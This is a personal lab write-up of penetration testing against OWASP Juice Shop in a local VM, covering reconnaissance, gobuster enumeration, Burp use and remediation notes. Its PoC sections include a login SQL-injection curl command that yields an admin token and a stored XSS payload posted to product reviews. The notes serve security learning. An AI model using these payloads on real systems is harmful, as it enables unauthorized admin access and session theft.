**Target:** http://192.168.99.128:3000  
**Lab host:** Kali VM (NAT)  
**VM IP:** 192.168.99.128  
**Date:** 2025-10-22  
**Author:** dinnie

---

## Environment & Setup

Kali Linux VM (NAT).  
Tools used: curl, nmap, gobuster, ss, jq, docker, Burp Suite.  
Lab folder: `~/lab`.

Commands used for initial checks:
ip a
sudo ss -tulpn | grep 3000
curl -I http://192.168.99.128:3000

yaml
Copy code

Key outputs / observations:
- `ip a` showed `inet 192.168.99.128/24` on `eth0` (VM address used).  
- `curl -I http://192.168.99.128:3000` returned `HTTP/1.1 200 OK` (root reachable).  
- `ss` showed `docker-proxy` listening on port 3000 (service inside Docker).

---

## Reconnaissance & Scans

Curl probes run against several endpoints:
curl -I http://192.168.99.128:3000
curl -I http://192.168.99.128:3000/scoreboard
curl -I http://192.168.99.128:3000/rest
curl -I http://192.168.99.128:3000/api
curl http://192.168.99.128:3000/robots.txt

markdown
Copy code

Findings:
- Root and `/scoreboard` returned **200 OK**.  
- `/rest` and `/api` returned **500 Internal Server Error** with stack traces (backend routes present).  
- `robots.txt` contains `User-agent: *` and `Disallow: /ftp`.

Gobuster notes:
- Initial gobuster returned false positives because the app returns `200 OK` for non-existing paths.
- Use `--wildcard` or target `127.0.0.1` and a small custom wordlist to avoid noise.

---

## Interesting Endpoints Discovered

- `/.env` → returned the app index (no secrets leaked in this setup).  
- `/.git` → returned **200 OK** (possible repo exposure — investigate in lab only).  
- `/uploads` → **200 OK** (files may be present).  
- `/api` & `/rest` → **500 errors** with stack traces.  
- `robots.txt` → disallows `/ftp` (check `/ftp` for backups or files).

---

## Burp Suite Setup & Actions

- Burp Suite installed on Kali.  
- Firefox configured to proxy to `127.0.0.1:8080`.  
- Burp CA certificate installed in Firefox.

Actions:
- Intercepted login request and forwarded to Repeater for testing.  
- Observed malformed JSON causing 500 error with message:
Bad control character in string literal in JSON at position 21

yaml
Copy code

---

## Admin Login (Obtained Token)

A login attempt returned JSON with an authentication object indicating `umail: admin@juice-sh.op` and a token (redacted here).  
This token can be used in the header:
Authorization: Bearer <token>

bash
Copy code
Example verification command (after saving token to `$token`):
curl -s -H "Authorization: Bearer $token" http://192.168.99.128:3000/rest/user/whoami | jq

yaml
Copy code

---

## Files Saved / Artifacts

Saved artifacts and files (local):
- `~/lab/common-small.txt` — small gobuster wordlist.  
- `~/lab/juice-gobuster-small.txt` — gobuster output.  
- `~/lab/juice_dirs_wild.txt` — gobuster output with `--wildcard`.  
- `~/lab/juice_env.txt` — result of `curl /.env`.  
- `~/lab/juice-shop/notes/juice-shop-notes.md` — this file.  
- Additional saved curl responses/screenshots as needed.

---

## Repro Steps (Commands)

Basic environment checks and probes:
ip a
sudo ss -tulpn | grep 3000
curl -I http://192.168.99.128:3000
curl -I http://192.168.99.128:3000/scoreboard
curl -I http://192.168.99.128:3000/rest
curl -I http://192.168.99.128:3000/api
curl http://192.168.99.128:3000/robots.txt

css
Copy code

Create a custom small wordlist:
cat > ~/lab/common-small.txt <<'EOF'
admin
login
logout
dashboard
api
rest
assets
uploads
images
js
css
config
server-status
.git
.env
README
setup
install
backup
db
sql
user
users
product
products
search
order
orders
cart
checkout
scoreboard
EOF

csharp
Copy code

Run gobuster with wildcard:
gobuster dir -u http://192.168.99.128:3000 -w ~/lab/common-small.txt -x html,js,php,txt,json -t 30 --wildcard -o ~/lab/juice_dirs_wild.txt

bash
Copy code

Save `.env` response:
curl -s http://192.168.99.128:3000/.env -o ~/lab/juice_env.txt

sql
Copy code

Check API example:
curl -s http://192.168.99.128:3000/rest/products | sed -n '1,120p'

pgsql
Copy code

---

## Findings & Impact Summary

- Server reachable and serving SPA (`index.html`).  
- API endpoints exist and produced stack traces on some probes.  
- `.env` did not expose secrets in this instance.  
- `.git` appears accessible and may leak repository data — high risk if real.  
- `robots.txt` points to `/ftp` — check for backups/files.  
- Admin token obtained — provides privileged API access in the lab.

Impact rating: **High** for learning in a lab environment; **critical** if found on a public production system.

---

## Next Recommended Steps (Priority)

1. Enumerate `.git` safely (lab only) and recover any useful files.  
2. Use admin token to call `/rest/user/whoami` and other admin-only endpoints.  
3. Inspect `/ftp` and `/uploads` for backups or sensitive files.  
4. Use Burp Repeater to test for IDOR, JSON tampering, and stored XSS.  
5. Document PoCs (request/response, screenshots).  
6. Reset the Juice Shop container after any destructive testing.

---

## Remediation Suggestions (If This Were Real)

- Deny public access to `/.git` and `/.env`.  
- Avoid printing stack traces to users in production; log internally.  
- Validate JSON and inputs; handle parse errors gracefully.  
- Use short-lived, scoped tokens and proper session management.  
- Implement CSP and proper output encoding to mitigate XSS.  
- Audit file uploads and ftp directories; enforce access controls.

---

## Quick Checklist

- Save this notes file and `common-small.txt` under `~/lab`.  
- Redact tokens and secrets before committing or sharing.  
- Keep screenshots and raw responses in `artifacts/` and do not push secrets to public repos.

End of report.

### PoC: Stored XSS — Product 1 — 2025-10-23
**Target:** http://127.0.0.1:3000/#/product/1  
**Payload:** `<p>poc-xss-01</p><svg/onload=console.log("poc-xss-01")>`  
**How submitted:** POST /rest/products/1/reviews with Bearer token (admin)  
**Artifacts:**  
 - Request body: artifacts/requests/xss_payload.json  
 - Raw POST request/response: artifacts/responses/xss_response.txt  
 - Product page HTML: artifacts/responses/product_1.html  
 - Product API raw: artifacts/responses/product_1_api_raw.txt  
**Impact:** Stored XSS.  

## PoC: Admin accounts & Stored XSS (2025-10-24) - quick summary
**Target:** http://192.168.99.128:3000  
**Author:** dinnie  
**Date:** 2025-10-24

### Summary
Recovered the application SQLite DB from the local container, enumerated the `Users` table and confirmed multiple admin accounts. Also validated a stored-XSS payload on Product 1. All testing performed in lab environment only.

### Key findings
- DB located and copied: `~/lab/juice-shop/container_dump/juice-shop/data/juiceshop.sqlite` (local copy; removed after redaction/archival).
- Admin user IDs (redacted evidence): `1, 4, 6, 9, 10, 12, 22`. See artifact: `~/lab/juice-shop/artifacts/idor/admin_users_redacted.csv`.
- Stored XSS PoC (Product 1): payload `<p>poc-xss-01</p><svg/onload=console.log("poc-xss-01")>` stored via `POST /rest/products/1/reviews`. Artifacts: `~/lab/juice-shop/artifacts/requests/xss_payload.json`, `~/lab/juice-shop/artifacts/responses/xss_response_redacted.txt`.

### Repro (high-level)
1. Extract container files: `sudo docker cp <container>:/juice-shop ~/lab/juice-shop/container_dump`  
2. Open local DB: `sqlite3 ~/lab/juice-shop/db_inspect/juice_shop.db` and query `Users` table.  
3. Perform login SQLi (lab): `curl -X POST -d '{"email":"'\'' OR '\''1'\''='\''1'\''--","password":"password"}' http://192.168.99.128:3000/rest/user/login` to reproduce token generation (do not store tokens in notes).  
4. Stored XSS PoC: `POST /rest/products/1/reviews` with payload; verify on `/product/1`.

### Impact & remediation (brief)
- **Impact:** Admin accounts & DB exposure in production would allow privilege escalation and data exfiltration. Stored XSS can result in session theft or CSRF in a real environment.  
- **Remediation:** Protect `.git`/.env, do not publish DBs, validate/encode inputs, use CSP, avoid printing stack traces.

### Artifacts (redacted, local)
- `~/lab/juice-shop/artifacts/idor/admin_users_redacted.csv`  
- `~/lab/juice-shop/artifacts/idor/whoami_db_admin.txt`  
- `~/lab/juice-shop/artifacts/idor/enum_*` (automated enumeration outputs)  
- `~/lab/juice-shop/artifacts/responses/xss_response_redacted.txt` and `~/lab/juice-shop/artifacts/requests/xss_payload.json`

